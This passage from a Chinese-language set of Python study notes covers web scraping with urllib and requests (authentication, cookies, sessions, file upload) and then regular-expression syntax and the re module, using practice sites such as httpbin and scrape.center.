URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span> <span class="token comment">#打印httperror的状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>身份验证</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> HTTPPasswordMgrWithDefaultRealm<span class="token punctuation">,</span>HTTPBasicAuthHandler<span class="token punctuation">,</span>build_opener<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span>  URLErrorusername<span class="token operator">=</span><span class="token string">'admin'</span>password<span class="token operator">=</span><span class="token string">'admin'</span>url<span class="token operator">=</span><span class="token string">'https://ssr3.scrape.center/'</span>p<span class="token operator">=</span>HTTPPasswordMgrWithDefaultRealm<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>add_password<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token comment">#账户对象</span>auth_handler<span class="token operator">=</span>HTTPBasicAuthHandler<span class="token punctuation">(</span>p<span class="token punctuation">)</span>opener<span class="token operator">=</span>build_opener<span class="token punctuation">(</span>auth_handler<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    result<span class="token operator">=</span>opener<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    html<span class="token operator">=</span>result<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token keyword">except</span> URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置Cookie</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> http<span class="token punctuation">.</span>cookiejar<span class="token punctuation">,</span>urllib<span class="token punctuation">.</span>requestcookie <span class="token operator">=</span> http<span class="token punctuation">.</span>cookiejar<span class="token punctuation">.</span>CookieJar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#声明一个CookieJar对象</span>handler <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>HTTPCookieProcessor<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>opener<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>handler<span class="token punctuation">)</span>response<span class="token operator">=</span>opener<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> cookie<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>item<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="requests"><a class="markdownIt-Anchor" href="#requests"></a> <strong>requests</strong></h2><p>对比起urllib库实则是方便太多了，但是urllib是标准库捏,还是要学一下</p><p>,所有数据体返回体基本都是json格式</p><ul><li>抓数据</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requestsr<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/get'</span><span class="token punctuation">)</span><span class="token comment">#实现GET请求 同理.put .post .delete .patch实现其他请求</span><span class="token comment">#get请求添加额外信息</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'germey'</span>    <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">&#125;</span><span class="token comment">#传入的数据是json格式的</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.httpbin.org/get'</span><span class="token punctuation">,</span>params<span class="token operator">=</span>date<span class="token punctuation">)</span><span class="token comment">#网页返回的类型是str类型且是json格式的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo:爬取所有电影名</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requests<span class="token keyword">import</span> rer<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://ssr1.scrape.center/'</span><span class="token punctuation">)</span>pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;h2.*?>(.*?)&lt;/h2>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>titles<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>titles<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo2:抓取二进制数据，一半用于爬取图片，以及视频</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsr<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://scrape.center/favicon.ico'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token comment">#图片的二进制流转为str类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token comment">#返回bytes类型的数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>添加请求头</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'???'</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>响应</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>status_code<span class="token comment">#状态码</span>r<span class="token punctuation">.</span>headers <span class="token comment">#响应头</span>r<span class="token punctuation">.</span>cookies <span class="token comment">#cookie</span>r<span class="token punctuation">.</span>url <span class="token comment">#url</span>r<span class="token punctuation">.</span>histroy <span class="token comment">#请求历史</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>文件上传</li></ul><p>模拟上传文件</p><p>demo:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsfiles<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'favicon.ico'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://www.httpbin.org/post'</span><span class="token punctuation">,</span><span class="token builtin">file</span><span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment">#返回上传文件后的响应</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>设置Cookies</li></ul><p>只需要在headers的字典中添加’Cookie’：'xxx’即可</p><ul><li>维持Seesion</li></ul><p>不设置Seesion就相当于两次爬取打开两个浏览器，Cookie就无法保持</p><p>设置了一个Seesion，可以提高爬取速度而且维持Cookies</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#创建一个Session对象</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://httpbin.org/cookies/set/sessioncookie/123456789'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://httpbin.org/cookies'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> <strong>re</strong></h2><p><a href="https://tool.oschina.net/regex">在线正则表达式测试 (oschina.net)</a></p><p>正则教程：<a href="https://www.cnblogs.com/poloyy/category/1796055.html">https://www.cnblogs.com/poloyy/category/1796055.html</a></p><h3 id="正则语法"><a class="markdownIt-Anchor" href="#正则语法"></a> <strong>正则语法</strong></h3><table><thead><tr><th>正则字符</th><th>描述</th></tr></thead><tbody><tr><td>\</td><td>将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，“<code>n</code>&quot;匹配字符&quot;<code>n</code>&quot;。“<code>\n</code>&quot;匹配一个换行符。串行”<code>\\</code>“匹配”<code>\</code>“而”<code>\(</code>“则匹配”<code>(</code>&quot;。</td></tr><tr><td>^</td><td>匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配“<code>\n</code>&quot;或&quot;<code>\r</code>&quot;之后的位置。</td></tr><tr><td>$</td><td>匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，$也匹配“<code>\n</code>&quot;或&quot;<code>\r</code>&quot;之前的位置。</td></tr><tr><td>*</td><td>匹配前面的子表达式零次或多次。例如，zo*能匹配“<code>z</code>&quot;以及&quot;<code>zoo</code>&quot;。*等价于{0,}。</td></tr><tr><td>+</td><td>匹配前面的子表达式一次或多次。例如，“<code>zo+</code>“能匹配&quot;<code>zo</code>&quot;以及&quot;<code>zoo</code>”，但不能匹配&quot;<code>z</code>&quot;。+等价于{1,}。</td></tr><tr><td>?</td><td>匹配前面的子表达式零次或一次。例如，“<code>do(es)?</code>“可以匹配&quot;<code>does</code>&quot;或&quot;<code>does</code>&quot;中的&quot;<code>do</code>”。?等价于{0,1}。</td></tr><tr><td>{<em>n</em>}</td><td><em>n</em>是一个非负整数。匹配确定的<em>n</em>次。例如，“<code>o&#123;2&#125;</code>“不能匹配&quot;<code>Bob</code>&quot;中的&quot;<code>o</code>”，但是能匹配&quot;<code>food</code>&quot;中的两个o。</td></tr><tr><td>{<em>n</em>,}</td><td><em>n</em>是一个非负整数。至少匹配<em>n</em>次。例如，“<code>o&#123;2,&#125;</code>“不能匹配&quot;<code>Bob</code>&quot;中的&quot;<code>o</code>”，但能匹配&quot;<code>foooood</code>&quot;中的所有o。&quot;<code>o&#123;1,&#125;</code>“等价于&quot;<code>o+</code>”。&quot;<code>o&#123;0,&#125;</code>“则等价于&quot;<code>o*</code>”。</td></tr><tr><td>{<em>n</em>,<em>m</em>}</td><td><em>m</em>和<em>n</em>均为非负整数，其中<em>n</em>&lt;=<em>m</em>。最少匹配<em>n</em>次且最多匹配<em>m</em>次。例如，“<code>o&#123;1,3&#125;</code>&quot;将匹配&quot;<code>fooooood</code>&quot;中的前三个o。&quot;<code>o&#123;0,1&#125;</code>“等价于&quot;<code>o?</code>”。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td>?</td><td>当该字符紧跟在任何一个其他限制符（*,+,?，{<em>n</em>}，{<em>n</em>,}，{<em>n</em>,<em>m</em>}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串“<code>oooo</code>&quot;，&quot;<code>o+?</code>“将匹配单个&quot;<code>o</code>”，而&quot;<code>o+</code>“将匹配所有&quot;<code>o</code>”。</td></tr><tr><td>.</td><td>匹配除“<code>\</code><em><code>n</code></em>&quot;之外的任何单个字符。要匹配包括&quot;<code>\</code><em><code>n</code></em>&quot;在内的任何字符，请使用像&quot;`(.</td></tr><tr><td>(pattern)</td><td>匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，在VBScript中使用SubMatches集合，在JScript中则使用$0…$9属性。要匹配圆括号字符，请使用“<code>\(</code>“或”<code>\)</code>&quot;。</td></tr><tr><td>(?:pattern)</td><td>匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符“`(</td></tr><tr><td>(?=pattern)</td><td>正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“`Windows(?=95</td></tr><tr><td>(?!pattern)</td><td>正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如“`Windows(?!95</td></tr><tr><td>(?&lt;=pattern)</td><td>反向肯定预查，与正向肯定预查类拟，只是方向相反。例如，“`(?&lt;=95</td></tr><tr><td>(?&lt;!pattern)</td><td>反向否定预查，与正向否定预查类拟，只是方向相反。例如“`(?&lt;!95</td></tr><tr><td>x|y</td><td>匹配x或y。例如，“`z</td></tr><tr><td>[xyz]</td><td>字符集合。匹配所包含的任意一个字符。例如，“<code>[abc]</code>“可以匹配&quot;<code>plain</code>&quot;中的&quot;<code>a</code>”。</td></tr><tr><td>[^xyz]</td><td>负值字符集合。匹配未包含的任意字符。例如，“<code>[^abc]</code>“可以匹配&quot;<code>plain</code>&quot;中的&quot;<code>p</code>”。</td></tr><tr><td>[a-z]</td><td>字符范围。匹配指定范围内的任意字符。例如，“<code>[a-z]</code>&quot;可以匹配&quot;<code>a</code>&quot;到&quot;<code>z</code>&quot;范围内的任意小写字母字符。</td></tr><tr><td>[^a-z]</td><td>负值字符范围。匹配任何不在指定范围内的任意字符。例如，“<code>[^a-z]</code>&quot;可以匹配任何不在&quot;<code>a</code>&quot;到&quot;<code>z</code>&quot;范围内的任意字符。</td></tr><tr><td>\b</td><td>匹配一个单词边界，也就是指单词和空格间的位置。例如，“<code>er\b</code>&quot;可以匹配&quot;<code>never</code>&quot;中的&quot;<code>er</code>&quot;，但不能匹配&quot;<code>verb</code>&quot;中的&quot;<code>er</code>&quot;。</td></tr><tr><td>\B</td><td>匹配非单词边界。“<code>er\B</code>&quot;能匹配&quot;<code>verb</code>&quot;中的&quot;<code>er</code>&quot;，但不能匹配&quot;<code>never</code>&quot;中的&quot;<code>er</code>&quot;。</td></tr><tr><td>\cx</td><td>匹配由x指明的控制字符。例如，\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的“<code>c</code>&quot;字符。</td></tr><tr><td>\d</td><td>匹配一个数字字符。等价于[0-9]。</td></tr><tr><td>\D</td><td>匹配一个非数字字符。等价于[^0-9]。</td></tr><tr><td>\f</td><td>匹配一个换页符。等价于\x0c和\cL。</td></tr><tr><td>\n</td><td>匹配一个换行符。等价于\x0a和\cJ。</td></tr><tr><td>\r</td><td>匹配一个回车符。等价于\x0d和\cM。</td></tr><tr><td>\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。</td></tr><tr><td>\S</td><td>匹配任何非空白字符。等价于[^ \f\n\r\t\v]。</td></tr><tr><td>\t</td><td>匹配一个制表符。等价于\x09和\cI。</td></tr><tr><td>\v</td><td>匹配一个垂直制表符。等价于\x0b和\cK。</td></tr><tr><td>\w</td><td>匹配包括下划线的任何单词字符。等价于“<code>[A-Za-z0-9_]</code>&quot;。</td></tr><tr><td>\W</td><td>匹配任何非单词字符。等价于“<code>[^A-Za-z0-9_]</code>&quot;。</td></tr><tr><td>\x<em>n</em></td><td>匹配<em>n</em>，其中<em>n</em>为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，“<code>\x41</code>&quot;匹配&quot;<code>A</code>&quot;。“<code>\x041</code>&quot;则等价于”<code>\x04&amp;1</code>&quot;。正则表达式中可以使用ASCII编码。.</td></tr><tr><td>*num*</td><td>匹配<em>num</em>，其中<em>num</em>是一个正整数。对所获取的匹配的引用。例如，“<code>(.)\1</code>&quot;匹配两个连续的相同字符。</td></tr><tr><td>*n*</td><td>标识一个八进制转义值或一个向后引用。如果*n<em>之前至少</em>n<em>个获取的子表达式，则</em>n<em>为向后引用。否则，如果</em>n<em>为八进制数字（0-7），则</em>n*为一个八进制转义值。</td></tr><tr><td>*nm*</td><td>标识一个八进制转义值或一个向后引用。如果*nm<em>之前至少有</em>nm<em>个获得子表达式，则</em>nm<em>为向后引用。如果*nm</em>之前至少有<em>n</em>个获取，则<em>n</em>为一个后跟文字<em>m</em>的向后引用。如果前面的条件都不满足，若<em>n</em>和<em>m</em>均为八进制数字（0-7），则*nm<em>将匹配八进制转义值</em>nm*。</td></tr><tr><td>*nml*</td><td>如果<em>n</em>为八进制数字（0-3），且<em>m和l</em>均为八进制数字（0-7），则匹配八进制转义值<em>nm</em>l。</td></tr><tr><td>\u<em>n</em></td><td>匹配<em>n</em>，其中<em>n</em>是一个用四个十六进制数字表示的Unicode字符。例如，\u00A9匹配版权符号</td></tr></tbody></table><blockquote><p>常见正则表达式运算符的优先级：</p></blockquote><ul><li><p><strong>转义符号：</strong> <code>\</code> 是用于转义其他特殊字符的转义符号。它具有最高的优先级。</p><p>示例：<code>\d</code>、<code>\.</code> 等，其中 <code>\d</code> 匹配数字，<code>\.</code> 匹配点号。</p></li><li><p><strong>括号：</strong> 圆括号 <code>()</code> 用于创建子表达式，具有高于其他运算符的优先级。</p><p>示例：<code>(abc)+</code> 匹配 “abc” 一次或多次。</p></li><li><p><strong>量词：</strong> 量词指定前面的元素可以重复的次数。</p><p>示例：<code>a*</code> 匹配零个或多个 “a”。</p></li><li><p><strong>字符类：</strong> 字符类使用方括号 <code>[]</code> 表示，用于匹配括号内的任意字符。</p><p>示例：<code>[aeiou]</code> 匹配任何一个元音字母。</p></li><li><p><strong>断言：</strong> 断言是用于检查字符串中特定位置的条件的元素。</p><p>示例：<code>^</code> 表示行的开头，<code>$</code> 表示行的结尾。</p></li><li><p><strong>连接：</strong> 连接在没有其他运算符的情况下表示字符之间的简单连接。</p><p>示例：<code>abc</code> 匹配 “abc”。</p></li><li><p><strong>管道：</strong> 管道符号 <code>|</code> 表示&quot;或&quot;关系，用于在多个模式之间选择一个。</p><p>示例：<code>cat|dog</code> 匹配 “cat” 或 “dog”。</p></li></ul><h3 id="常用正则"><a class="markdownIt-Anchor" href="#常用正则"></a> 常用正则</h3><table><thead><tr><th>target</th><th>pattern</th></tr></thead><tbody><tr><td>用户名</td><td>/<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>{3,16}$/</td></tr><tr><td>密码</td><td>/<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>{6,18}$/</td></tr><tr><td>密码2</td><td>(?=^.{8,}<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \d at position 7: )(?=.*\̲d̲)(?=.*\W+)(?=.*…'>)(?=.*\d)(?=.*\W+)(?=.*[A-Z])(?=.*[a-z])(?!.*\n).*</span> (由数字/大写字母/小写字母/标点符号组成，四种都必有，8位以上)</td></tr><tr><td>十六进制值</td><td>/^#?([a-f0-9]{6}|[a-f0-9]{3})$/</td></tr><tr><td>电子邮箱</td><td>/^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \d at position 11: /   /^[a-z\̲d̲]+(\.[a-z\d]+)*…'>/   /^[a-z\d]+(\.[a-z\d]+)*@([\da-z](-[\da-z])?)+(\.{1,2}[a-z]+)+</span>/或\w+([-+.]\w+)<em>@\w+([-.]\w+)</em>.\w+([-.]\w+)*</td></tr><tr><td>URL</td><td>/^(https?://)?([\da-z.-]+).([a-z.]{2,6})([/\w .-]<em>)</em>/?$/ 或 [a-zA-z]+://[^\s]*</td></tr><tr><td>IP 地址</td><td>/((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)/ /^(?😦?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/ 或 ((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)</td></tr><tr><td>HTML 标签</td><td>/<sup>&lt;([a-z]+)([</sup>&lt;]+)<em>(?:&gt;(.</em>)&lt;/\1&gt;|\s+/&gt;)$/或&lt;(.<em>)(.</em>)&gt;.<em>&lt;/\1&gt;|&lt;(.</em>) /&gt;</td></tr><tr><td>删除代码\注释</td><td>(?&lt;!http:|\S)//.*$</td></tr><tr><td>匹配双字节字符(包括汉字在内)</td><td>[^\x00-\xff]</td></tr><tr><td>汉字(字符)</td><td>[\u4e00-\u9fa5]</td></tr><tr><td>Unicode编码中的汉字范围</td><td>/<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>+$/</td></tr><tr><td>中文及全角标点符号(字符)</td><td>[\u3000-\u301e\ufe10-\ufe19\ufe30-\ufe44\ufe50-\ufe6b\uff01-\uffee]</td></tr><tr><td>日期(年-月-日)</td><td>(\d{4}|\d{2})-((0?([1-9]))|(1[1|2]))-((0?[1-9])|(<a href="%5B1-9%5D">12</a>)|(3[0|1]))</td></tr><tr><td>日期(月/日/年)</td><td>((0?[1-9]{1})|(1[1|2]))/(0?[1-9]|([12][1-9])|(3[0|1]))/(\d{4}|\d{2})</td></tr><tr><td>时间(小时:分钟, 24小时制)</td><td>((1|0?)[0-9]|2[0-3])😦[0-5][0-9])</td></tr><tr><td>中国大陆固定电话号码</td><td>(\d{4}-|\d{3}-)?(\d{8}|\d{7})</td></tr><tr><td>中国大陆手机号码</td><td>1\d{10}</td></tr><tr><td>中国大陆邮政编码</td><td>[1-9]\d{5}</td></tr><tr><td>中国大陆身份证号(15位或18位)</td><td>\d{15}(\d\d[0-9xX])?</td></tr><tr><td>非负整数(正整数或零)</td><td>\d+</td></tr><tr><td>正整数</td><td>[0-9]<em>[1-9][0-9]</em></td></tr><tr><td>负整数</td><td>-[0-9]<em>[1-9][0-9]</em></td></tr><tr><td>整数</td><td>-?\d+</td></tr><tr><td>小数</td><td>(-?\d+)(.\d+)?</td></tr><tr><td>空白行</td><td>\n\s*\r 或者 \n\n(editplus) 或者 <sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>*\n</td></tr><tr><td>QQ号码</td><td>[1-9]\d{4,}</td></tr><tr><td>不包含abc的单词</td><td>\b((?!abc)\w)+\b</td></tr><tr><td>匹配首尾空白字符</td><td>^\s*|\s*$</td></tr><tr><td>编辑常用</td><td>以下是针对特殊中文的一些替换(editplus)<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>.<em>\n <sup>[</sup>第].</em>\n <sup>[习题].*\n</sup>[\s\S ]<em>\n <sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup></em>. <sup class="footnote-ref"><a href="#fn7" id="fnref7">[7]</a></sup><em>\n &lt;p[^&lt;&gt;</em>]&gt;href=“javascript:if(confirm(‘(.<em>?)‘))window.location=’(.</em>?)’”&lt;span style=&quot;.[<sup>“]*rgb(255,255,255)”&gt;.[</sup>&lt;&gt;]<em></span> <DIV class=xs0>[\s\S]</em>?</DIV></td></tr></tbody></table><h3 id="re库"><a class="markdownIt-Anchor" href="#re库"></a> <strong>re库</strong></h3><p>参考网址：<a href="https://zhuanlan.zhihu.com/p/565487182">https://zhuanlan.zhihu.com/p/565487182</a></p><p>re模块官方文档:<a href="https://docs.python.org/zh-cn/3.8/library/re.html">https://docs.python.org/zh-cn/3.8/library/re.html</a></p><p>正则的匹配模式</p><blockquote><p><strong>flags</strong> : 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为：</p></blockquote><ol><li>re.I re.IGNORECASE忽略大小写</li><li>re.L re.LOCALE表示特殊字符集 w, W, , B, s, S 依赖于当前环境</li><li>re.M re.MULTILINE多行模式</li><li>re.S  re.DOTALL 即为 . 并且包括换行符在内的任意字符（. 不包括换行符）</li><li>re.U 表示特殊字符集 w, W, , B, d, D, s, S 依赖于 Unicode 字符属性数据库</li><li>re.X re.VERBOSE为了增加可读性，忽略空格和 # 后面的注释,可以在正则表达式中加注解</li><li>re.A re.ASCII  让 \w, \W, \b, \B, \d, \D, \s 和 \S 只匹配ASCII，而不是Unicode。</li></ol><h4 id="单项查找函数"><a class="markdownIt-Anchor" href="#单项查找函数"></a> 单项查找函数</h4><blockquote><p>re.search(pattern,string,flags=0) 三个函数参数相同</p><ul><li>pattern 匹配规则</li><li>string 匹配内容</li><li>flags 匹配模式</li></ul></blockquote><ul><li>re.search: 会匹配整个字符串，并返回第一个成功的匹配。如果匹配失败，则返回None</li><li>re.match:  必须从字符串开头匹配</li><li>re.fullmatch: 整个字符串与正则完全匹配</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#search实例</span><span class="token keyword">import</span> re<span class="token builtin">str</span><span class="token operator">=</span><span class="token string">'ab12cd34ef567'</span>info<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'([0-9]&#123;2&#125;)'</span><span class="token punctuation">)</span><span class="token comment">#[0-9]&#123;2&#125;表示0-9的任意数字匹配2次，()代表作为一组返回</span>result<span class="token operator">=</span>info<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment">#('12',)  每次只返回一个，但是如果第二次返回就是('12','34')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#match实例</span><span class="token keyword">import</span> re<span class="token builtin">str</span><span class="token operator">=</span><span class="token string">'ab12cd34ef567'</span>info<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'([a-z]&#123;2&#125;)(\d&#123;2&#125;)'</span><span class="token punctuation">)</span><span class="token comment">#group(0)表示a-z的两个任意字符，\d&#123;2&#125;表示数字的两个任意字符</span>result<span class="token operator">=</span>info<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#ab12</span>result1<span class="token operator">=</span>info<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#('ab','12')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#fullmatch实例-比match限制更严格</span><span class="token keyword">import</span> restring<span class="token operator">=</span><span class="token string">"MyTools"</span>pattern<span class="token operator">=</span><span class="token string">'My'</span>re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>string<span class="token punctuation">)</span>re<span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="多项查找函数"><a class="markdownIt-Anchor" href="#多项查找函数"></a> <strong>多项查找函数</strong></h4><ul><li>findall： 从字符串任意位置查找，返回一个列表</li><li>finditer：从字符串任意位置查找，返回一个迭代器</li></ul><blockquote><p>如果可能存在大量的匹配项的话，建议使用finditer函数，一般情况使用findall函数基本没啥影响。列表是一次性生成在内存中，而迭代器是需要使用时一点一点生成出来的，内存使用更优。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#findall实例</span>s<span class="token operator">=</span><span 